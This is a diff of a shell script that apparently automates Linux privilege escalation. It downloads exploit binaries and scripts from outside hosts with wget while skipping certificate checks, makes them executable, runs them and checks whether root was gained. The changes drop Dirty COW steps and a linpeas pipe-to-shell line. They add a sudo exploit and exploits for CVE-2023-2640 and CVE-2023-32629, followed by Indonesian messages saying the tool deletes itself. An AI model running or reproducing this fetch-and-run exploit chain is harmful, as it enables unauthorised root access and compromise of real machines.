@@ -249,18 +249,6 @@ chmod 777 "cowroot"
 check_root
 rm "cowroot"
 
-wget -q "https://0-gram.github.io/id-0/dcow" --no-check-certificate
-chmod 777 "dcow"
-./dcow
-check_root
-rm "dcow"
-
-wget -q "https://0-gram.github.io/id-0/dirtycow" --no-check-certificate
-chmod 777 "dirtycow"
-./dirtycow
-check_root
-rm "dirtycow"
-
 wget -q "https://0-gram.github.io/id-0/exp" --no-check-certificate
 chmod 777 "exp"
 ./exp
@@ -299,5 +287,24 @@ rm "exploit_userspec.py"
 rm "0"
 rm "kmem"
 rm "sendfile1"
-# From github
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+wget -q "https://raw.githubusercontent.com/CallMeBatosay/Privilege-Escalation/main/sudo-hax-me-a-sandwich" --no-check-certificate
+chmod 777 "sudo-hax-me-a-sandwich"
+./sudo-hax-me-a-sandwich 0
+check_root
+./sudo-hax-me-a-sandwich 1
+check_root
+./sudo-hax-me-a-sandwich 2
+check_root
+rm "sudo-hax-me-a-sandwich"
+
+wget -q "https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh" --no-check-certificate
+chmod 777 "exploit.sh"
+check_root
+rm "exploit.sh"
+
+
+echo "TERIMAKASI TELAH MENGGUNAKAN TOOLS KAMI"
+echo "TOOLS INI AKAN DI HAPUS DARI WEB"
+echo "AGAR TOOLS SAYA TETAP AMAN TIDAK DI CURI"
+rm "root.sh"
